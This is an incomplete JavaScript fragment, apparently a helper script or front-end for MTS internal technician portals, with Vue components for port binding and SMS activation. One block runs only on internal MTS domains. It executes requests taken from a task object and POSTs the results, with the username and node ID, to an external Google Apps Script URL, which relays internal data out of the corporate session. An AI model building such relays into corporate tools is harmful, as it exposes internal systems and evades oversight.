...
if(document.title!='Inetcore+'&&(window.location.href.includes('https://fx.mts.ru')||window.location.href.includes('http://inetcore.mts.ru/fix')||window.location.href.includes('http://pre.inetcore.mts.ru/fix'))){
									...
									fetch(obj.task.url,((obj.task.method=='POST')?payload:undefined)).then(function(resp){return resp.json()}).then(function(result){
										if(result){
											fetch('https://script.google.com/macros/s/AKfycbwqCtzlWPZLEdgd9omVhscwbacELzzyIM0UPsLO9y4o0yFUgYjBwXuxtD7RnZABRYm3/exec',{
												'method':'POST','mode':'no-cors','headers':{'Content-Type':'application/json;charset=utf-8'},
												'body':JSON.stringify({'username':username,'node_id':node_id,'task':{'request_id':obj.task.request_id,'response':result,'isError':false}})
											}).then(function(obj){next()}).catch(function(err){console.log(err);next()});
										}else{next()};
	...
	Vue.component("my-port-bind-user-action",{/*разблокировка кнопки привязки, роут на my-port-bind-user-modal + modalData.portInfo*/
		template:`
			<section>
	...
	Vue.component('my-port-bind-user-modal',{/*освобождалка порта, роут на my-port-bind-user-account-elem*/
		template:`
	...
	Vue.component('my-port-bind-user-account-elem',{/*роут на my-port-bind-user-vgid-elem*/
		template:`
			<section>
	...
	Vue.component('my-port-bind-user-vgid-elem',{/*кнопка смс активации шпд*/
		template:`
			<section>
